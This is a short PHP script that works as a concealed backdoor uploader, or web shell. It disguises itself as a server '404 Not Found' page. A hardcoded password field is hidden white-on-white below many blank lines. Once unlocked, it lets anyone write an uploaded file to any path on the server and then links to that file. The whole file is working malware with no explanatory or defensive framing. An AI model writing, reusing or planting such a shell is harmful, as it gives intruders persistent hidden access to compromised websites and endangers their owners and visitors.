<?php
error_reporting(0);
@set_time_limit(0);
@session_start();
$xSoftware = trim(getenv("SERVER_SOFTWARE"));
$xServerName = $_SERVER["HTTP_HOST"];
$xPass = $_POST['pass'];
$xCheck_login = 1;
$xPassword = "207cs";
$xName = "yam";
if($xPass == $xPassword){
$_SESSION['login'] = "$xPass";
}
if($xCheck_login){
if(!isset($_SESSION['login']) or $_SESSION['login'] != $xPassword){
die("
<html>
<head>
<title>404 Not Found</title>
<style type=\"text/css\">
input{
margin:0;
background-color:#fff;
border:1px solid #fff;
}
</style>
</head>

<body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle your fucking request.</p>
<hr> 
<address>".$xSoftware." Server at ".$xServerName." Port 80 </address>
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<center>
<form method=\"post\">
<input type=\"password\" name=\"pass\">
</form>
</center>
</body>
</html>
");
}
}
{
        $hidefaul = @$_FILES["hidef"]; if($hidefaul["name"] != ''){ $fullpath = $_REQUEST["path"].$hidefaul["name"]; if(move_uploaded_file($hidefaul['tmp_name'],$fullpath)){echo "<h1><a href='$fullpath'>Dc roi thim</a></h1>";} }exit('<form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="hidef"><input type=submit value="Up"></form>');
	}
?>